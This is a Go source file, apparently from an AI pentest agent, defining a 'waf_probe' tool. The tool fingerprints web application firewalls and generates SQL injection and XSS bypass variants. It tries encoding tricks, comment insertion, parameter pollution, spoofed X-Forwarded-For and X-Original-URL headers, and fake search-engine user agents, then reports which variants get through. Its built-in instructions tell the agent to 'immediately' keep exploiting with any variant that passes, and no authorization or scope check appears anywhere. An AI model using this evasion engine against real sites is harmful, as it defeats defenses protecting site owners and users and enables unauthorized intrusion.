package agent

// WAF 探测与绕过原语（YCode 二开）：waf_probe 把「目标前面有没有 WAF / 什么 WAF /
// 哪些变形能穿透」从模型的自由发挥变成可核对的证据面：
//   ① 指纹：对目标发典型探测 payload 建立拦截基线，按响应特征（头/关键词/页面指纹）
//      识别常见 WAF/CDN（Cloudflare/阿里云盾/安全狗/宝塔/ModSecurity/加速乐…）；
//   ② 变形：对给定 payload 自动生成系统性变体（编码/双编码/大小写/注释插入/空白替换/
//      HPP 参数污染/XFF 与 X-Original-URL 头欺骗/搜索引擎 UA 等 ≤40 个）；
//   ③ 差分判定：放行基线(干净请求) vs 拦截基线(原始 payload) vs 变体响应——
//      状态码/长度与放行基线一致且无拦截特征 = 穿透嫌疑，附证据。
// 设计取向与 ssrf_probe 一致：一次调用完成一类系统性检查，请求经录制代理留痕。

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

// ---------- WAF/CDN 指纹特征 ----------

// wafFingerprint 一条特征：响应头前缀或响应体关键词 → 厂商名。
type wafFingerprint struct {
	kind string // header / body
	key  string // 头名(小写) 或体关键词(小写)
	name string
}

var wafFingerprints = []wafFingerprint{
	{"header", "cf-ray", "Cloudflare"},
	{"header", "cf-cache-status", "Cloudflare"},
	{"header", "x-alicdn", "阿里云 CDN/WAF"},
	{"header", "eagleid", "阿里云"},
	{"header", "x-safedog", "安全狗"},
	{"header", "wzws-ray", "知道创宇加速乐"},
	{"header", "x-yunjiasu", "百度云加速"},
	{"header", "x-waf-status", "自建 WAF"},
	{"header", "x-cdn", "CDN"},
	{"header", "x-via", "CDN/代理"},
	{"body", "attention required! | cloudflare", "Cloudflare"},
	{"body", "cloudflare-ray-id", "Cloudflare"},
	{"body", "yundun", "阿里云盾"},
	{"body", "errors.aliyun.com", "阿里云盾"},
	{"body", "polarwaf", "PolarWAF"},
	{"body", "safedog", "安全狗"},
	{"body", "safedogsite", "安全狗"},
	{"body", "wzws-waf", "知道创宇加速乐"},
	{"body", "jiasule", "知道创宇加速乐"},
	{"body", "宝塔网站防火墙", "宝塔 WAF"},
	{"body", "btwaf", "宝塔 WAF"},
	{"body", "mod_security", "ModSecurity"},
	{"body", "modsecurity", "ModSecurity"},
	{"body", "not acceptable", "ModSecurity(406)"},
	{"body", "naxsi", "Naxsi"},
	{"body", " intercepted", "通用 WAF 拦截页"},
	{"body", "您的请求带有不合法参数", "通用 WAF 拦截页"},
	{"body", "防火墙", "WAF/安全设备"},
	{"body", "安全验证", "WAF/风控"},
	{"body", "blocked", "WAF/网关拦截"},
	{"body", "forbidden", "WAF/网关拦截(弱特征)"},
	{"body", "waf", "WAF(弱特征)"},
}

// fingerprintWAF 对一个响应给出识别结论（可能空）。
func fingerprintWAF(header http.Header, body string) []string {
	hits := []string{}
	seen := map[string]bool{}
	add := func(n string) {
		if n != "" && !seen[n] {
			seen[n] = true
			hits = append(hits, n)
		}
	}
	for k, vs := range header {
		lk := strings.ToLower(k)
		for _, fp := range wafFingerprints {
			if fp.kind == "header" && strings.HasPrefix(lk, fp.key) && len(vs) > 0 {
				add(fp.name)
			}
		}
	}
	lb := strings.ToLower(body)
	for _, fp := range wafFingerprints {
		if fp.kind == "body" && strings.Contains(lb, fp.key) {
			add(fp.name)
		}
	}
	return hits
}

// ---------- 变形引擎 ----------

type wafVariant struct {
	Name    string            `json:"name"`
	Payload string            `json:"payload"` // 替换进占位符的值（未编码）
	Headers map[string]string `json:"headers,omitempty"`
	Mode    string            `json:"mode"` // query(占位替换) / param_dup(参数重复)
}

// rndCase 大小写随机翻转。
func rndCase(s string, rng *rand.Rand) string {
	out := []rune(s)
	for i, r := range out {
		if rng.Intn(2) == 0 {
			if r >= 'a' && r <= 'z' {
				out[i] = r - 32
			} else if r >= 'A' && r <= 'Z' {
				out[i] = r + 32
			}
		}
	}
	return string(out)
}

// insertComments 在每个词元间插入 /**/（SQLi 经典：SEL/**/ECT）。
func insertComments(s string) string {
	var b strings.Builder
	for i, r := range s {
		if i > 0 {
			b.WriteString("/**/")
		}
		b.WriteRune(r)
	}
	return b.String()
}

// commentAfterKeywords 在关键词后插入注释：union/**/select 风格（按空格分词）。
func commentAfterKeywords(s string) string {
	parts := strings.Fields(s)
	if len(parts) < 2 {
		return s
	}
	return strings.Join(parts, "/**/")
}

// generateBypassVariants 由一个原始 payload 生成系统性变体（≤40 个）。
func generateBypassVariants(payload, param string, rng *rand.Rand) []wafVariant {
	var out []wafVariant
	add := func(name, p string, headers map[string]string, mode string) {
		if len(out) >= 40 || p == "" {
			return
		}
		out = append(out, wafVariant{Name: name, Payload: p, Headers: headers, Mode: mode})
	}

	// —— 编码类 ——
	add("url-encode-all", url.QueryEscape(payload), nil, "query")
	add("double-encode", url.QueryEscape(url.QueryEscape(payload)), nil, "query")
	add("encode-special", strings.ReplaceAll(payload, "'", "%27"), nil, "query")
	add("partial-encode-percent", strings.ReplaceAll(payload, " ", "%20"), nil, "query")

	// —— 大小写 ——
	add("case-flip", rndCase(payload, rng), nil, "query")
	add("case-random-2", rndCase(payload, rng), nil, "query")

	// —— 注释/空白替换 ——
	add("inline-comment-each", insertComments(payload), nil, "query")
	add("comment-between-words", commentAfterKeywords(payload), nil, "query")
	for _, rep := range []string{"%09", "%0a", "%0d", "+", "%a0"} {
		p := strings.ReplaceAll(payload, " ", rep)
		add("space->"+rep, p, nil, "query")
	}
	add("comment-space", strings.ReplaceAll(payload, " ", "/**/"), nil, "query")
	add("newline-inside", strings.ReplaceAll(payload, " ", "%0a%0d"), nil, "query")

	// —— MySQL 内联注释版本 ——
	if low := strings.ToLower(payload); strings.Contains(low, "select") || strings.Contains(low, "union") {
		v := payload
		for _, kw := range []string{"select", "union", "or", "and"} {
			idx := strings.Index(strings.ToLower(v), kw)
			if idx >= 0 {
				v = v[:idx] + "/!" + kw + "/" + v[idx+len(kw):]
				break
			}
		}
		add("mysql-inline-version", v, nil, "query")
	}

	// —— HPP 参数污染 ——
	if param != "" {
		add("hpp-dup-param", payload+"+"+payload, nil, "param_dup")
		add("hpp-split", payload, nil, "param_dup")
		add("junk-param-prefix", payload, map[string]string{"X-YC-Junk": strings.Repeat("A", 64)}, "query")
	}

	// —— 头欺骗 ——
	add("xff-localhost", payload, map[string]string{"X-Forwarded-For": "127.0.0.1"}, "query")
	add("xff-intranet", payload, map[string]string{"X-Forwarded-For": "10.0.0.1"}, "query")
	add("x-original-url", payload, map[string]string{"X-Original-URL": "/", "X-Rewrite-URL": "/"}, "query")
	add("ua-googlebot", payload, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, "query")
	add("ua-baiduspider", payload, map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"}, "query")
	add("referer-self", payload, map[string]string{"Referer": "http://127.0.0.1/"}, "query")

	// —— 编码+大小写组合 ——
	add("encode+case", url.QueryEscape(rndCase(payload, rng)), nil, "query")
	add("comment+case", insertComments(rndCase(payload, rng)), nil, "query")
	add("percent-null-prefix", "%00"+payload, nil, "query")
	add("tab-prefix", "%09"+payload, nil, "query")
	add("trail-null", payload+"%00", nil, "query")

	return out
}

// ---------- 工具 ----------

func (t *ToolSet) wafProbe() actool.CoreTool {
	return readTool("waf_probe",
		"(打点/WAF)对目标注入点做 WAF 指纹识别 + payload 变形穿透测试：①发原始 payload 建立拦截基线，按响应特征识别 WAF/CDN（Cloudflare/阿里云盾/安全狗/宝塔/ModSecurity/加速乐等）②自动生成系统性变体（URL 编码/双编码/大小写混淆/注释插入/空白替换/HPP 参数污染/XFF 与 X-Original-URL 头欺骗/搜索引擎 UA 等 ≤40 个）③以【放行基线 vs 拦截基线 vs 变体响应】差分判定哪些变体穿透。用法：url 中用 {PAYLOAD} 占位（或 param 指定参数名），payload 传要测的原始载荷。命中变体=可用的绕过手法（立即用于后续利用并 report_finding 附证据）；全部被拦=该 payload 思路受阻（换 payload 类别再试，不是放弃）。温和探测：串行+间隔。",
		obj(map[string]any{
			"url": map[string]any{
				"type":        "string",
				"description": "目标 URL，把注入点写成 {PAYLOAD} 占位，如 http://t/api/search?q={PAYLOAD} ；不用占位时须传 param。",
			},
			"payload": map[string]any{
				"type":        "string",
				"description": "原始测试载荷，如 \"1' OR '1'='1\" 或 <script>alert(1)</script> ——变体由它自动生成。",
			},
			"param": map[string]any{
				"type":        "string",
				"description": "按参数名注入(覆盖该查询参数)，与 {PAYLOAD} 占位二选一；HPP 变体依赖它。",
			},
			"method": map[string]any{
				"type": "string", "default": "GET", "description": "HTTP 方法：GET(默认)/POST。",
			},
			"post_body": map[string]any{
				"type": "string", "description": "POST 请求体模板(可含 {PAYLOAD})。",
			},
			"headers": map[string]any{
				"type": "string", "description": "附加请求头，每行 'Key: Value'。",
			},
			"timeout_ms": map[string]any{
				"type": "integer", "default": 6000, "description": "单请求超时毫秒(2000..15000)。",
			},
			"proxy": map[string]any{
				"type": "string", "description": "HTTP 代理地址(可选)；留空默认走本任务录制代理(若有)。",
			},
		}, "url", "payload"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var p struct {
				URL       string `json:"url"`
				Payload   string `json:"payload"`
				Param     string `json:"param"`
				Method    string `json:"method"`
				PostBody  string `json:"post_body"`
				Headers   string `json:"headers"`
				TimeoutMs int    `json:"timeout_ms"`
				Proxy     string `json:"proxy"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			rawURL := strings.TrimSpace(p.URL)
			if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
				return actool.Errorf("url 必须以 http:// 或 https:// 开头"), nil
			}
			payload := p.Payload
			if strings.TrimSpace(payload) == "" {
				return actool.Errorf("payload 不能为空"), nil
			}
			param := strings.TrimSpace(p.Param)
			usePlaceholder := strings.Contains(rawURL, "{PAYLOAD}") || strings.Contains(p.PostBody, "{PAYLOAD}")
			if !usePlaceholder && param == "" {
				return actool.Errorf("请在 url/post_body 中用 {PAYLOAD} 占位，或传 param 指定注入参数名"), nil
			}
			method := strings.ToUpper(strings.TrimSpace(p.Method))
			if method == "" {
				method = http.MethodGet
			}
			if method != http.MethodGet && method != http.MethodPost {
				return actool.Errorf("method 仅支持 GET/POST"), nil
			}
			timeout := time.Duration(p.TimeoutMs) * time.Millisecond
			if timeout <= 0 {
				timeout = 6 * time.Second
			}
			if timeout > 15*time.Second {
				timeout = 15 * time.Second
			}
			client, err := t.probeHTTPClient(p.Proxy, timeout)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			rng := rand.New(rand.NewSource(time.Now().UnixNano())) //nolint:gosec // 变体随机化无需密码学强度

			buildURL := func(payloadValue string, extra map[string]string, mode string) string {
				u, err := url.Parse(rawURL)
				if err != nil {
					return strings.ReplaceAll(rawURL, "{PAYLOAD}", url.QueryEscape(payloadValue))
				}
				q := u.Query()
				if param != "" {
					if mode == "param_dup" {
						q.Add(param, payloadValue)
						q.Add(param, payloadValue)
					} else {
						q.Set(param, payloadValue)
					}
				}
				u.RawQuery = q.Encode()
				s := u.String()
				if param == "" || mode != "" {
					s = strings.ReplaceAll(s, "{PAYLOAD}", url.QueryEscape(payloadValue))
				}
				return s
			}
			do := func(payloadValue string, extra map[string]string, mode string) (status, size int, body string, ms int64, err error) {
				var req *http.Request
				bodyStr := strings.ReplaceAll(p.PostBody, "{PAYLOAD}", url.QueryEscape(payloadValue))
				if method == http.MethodPost {
					req, err = http.NewRequestWithContext(ctx, http.MethodPost, buildURL(payloadValue, extra, mode), strings.NewReader(bodyStr))
					if err != nil {
						return 0, 0, "", 0, err
					}
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				} else {
					req, err = http.NewRequestWithContext(ctx, http.MethodGet, buildURL(payloadValue, extra, mode), nil)
					if err != nil {
						return 0, 0, "", 0, err
					}
				}
				req.Header.Set("User-Agent", "YCode-recon/0.3")
				for _, line := range strings.Split(p.Headers, "\n") {
					if k, v, ok := strings.Cut(line, ":"); ok {
						req.Header.Set(strings.TrimSpace(k), strings.TrimSpace(v))
					}
				}
				for k, v := range extra {
					req.Header.Set(k, v)
				}
				start := time.Now()
				resp, err := client.Do(req)
				ms = time.Since(start).Milliseconds()
				if err != nil {
					return 0, 0, "", ms, err
				}
				rb, _ := io.ReadAll(io.LimitReader(resp.Body, 128<<10))
				_, _ = io.Copy(io.Discard, resp.Body)
				_ = resp.Body.Close()
				return resp.StatusCode, len(rb), string(rb), ms, nil
			}

			// ---- ① 放行基线（无害请求）----
			cleanPayload := "yc-waf-clean-probe"
			cStatus, cLen, cBody, _, err := do(cleanPayload, nil, "")
			if err != nil {
				return actool.Errorf("目标不可达(放行基线失败): " + err.Error()), nil
			}
			cleanHits := fingerprintWAF(nil, cBody)

			// ---- ② 拦截基线（原始 payload）----
			bStatus, bLen, bBody, _, err := do(payload, nil, "")
			if err != nil {
				return actool.Errorf("目标不可达(拦截基线失败): " + err.Error()), nil
			}
			blockedSignals := []string{"status:", strconv.Itoa(bStatus), "len:", strconv.Itoa(bLen)}
			bFp := fingerprintWAF(nil, bBody)
			// 拦截判定：状态码异常(403/406/429/418) 或 识别到 WAF 拦截页 或 长度骤变
			interceptStatus := bStatus == 403 || bStatus == 406 || bStatus == 429 || bStatus == 418 || bStatus == 501
			strongWAF := false
			for _, name := range bFp {
				if !strings.Contains(name, "弱特征") && !strings.Contains(name, "CDN") {
					strongWAF = true
				}
			}
			blocked := interceptStatus || strongWAF
			wafName := strings.Join(bFp, " / ")

			// ---- ③ 变体批量 ----
			variants := generateBypassVariants(payload, param, rng)
			type vResult struct {
				Name   string `json:"variant"`
				Status int    `json:"status"`
				Len    int    `json:"len"`
				Err    string `json:"error,omitempty"`
				Evi    string `json:"evidence,omitempty"`
				Hit    bool   `json:"hit"`
			}
			results := make([]vResult, 0, len(variants))
			var mu sync.Mutex
			passed := []string{}
			for i, v := range variants {
				if ctx.Err() != nil {
					break
				}
				if i > 0 {
					select {
					case <-time.After(150 * time.Millisecond):
					case <-ctx.Done():
					}
				}
				r := vResult{Name: v.Name}
				st, sz, _, _, derr := do(v.Payload, v.Headers, v.Mode)
				if derr != nil {
					r.Err = derr.Error()
				} else {
					r.Status, r.Len = st, sz
					// 穿透判定：状态码与放行基线一致 且 未命中拦截状态 且 体长接近放行基线
					notIntercepted := !(st == 403 || st == 406 || st == 429 || st == 418 || st == 501)
					if notIntercepted && st == cStatus {
						if cLen == 0 || abs(sz-cLen)*100/max(cLen, 1) <= 40 {
							r.Hit = true
							r.Evi = fmt.Sprintf("状态码 %d 与放行基线一致(拦截基线 %d)，长度 %d≈放行 %d", st, bStatus, sz, cLen)
							mu.Lock()
							passed = append(passed, v.Name)
							mu.Unlock()
						}
					}
				}
				mu.Lock()
				results = append(results, r)
				mu.Unlock()
			}
			_ = blockedSignals

			out := map[string]any{
				"url":              rawURL,
				"payload":          payload,
				"clean_baseline":   map[string]any{"status": cStatus, "len": cLen, "waf_signals": cleanHits},
				"blocked_baseline": map[string]any{"status": bStatus, "len": bLen, "waf_signals": bFp},
				"waf_fingerprint":  wafName,
				"intercepted":      blocked,
				"variant_count":    len(results),
				"results":          results,
				"passed_variants":  passed,
				"note":             "hit=穿透嫌疑(状态码与放行基线一致)——立即用该变体继续利用并保留证据；无 WAF 时(intercepted=false)无需绕过",
			}
			switch {
			case !blocked:
				out["verdict"] = fmt.Sprintf("目标未拦截该 payload(状态码 %d)——无需绕过，直接按原样继续利用", bStatus)
			case len(passed) > 0:
				out["verdict"] = fmt.Sprintf("WAF 拦截了原始 payload，但 %d/%d 个变体穿透：%s——按命中手法继续利用", len(passed), len(results), strings.Join(passed, ", "))
			default:
				out["verdict"] = fmt.Sprintf("WAF 拦截了原始 payload 且全部变体被拦——payload 类别受阻，换思路(不同漏洞类型/编码体系/协议层)而非重复尝试")
			}
			return jsonResult(out)
		})
}
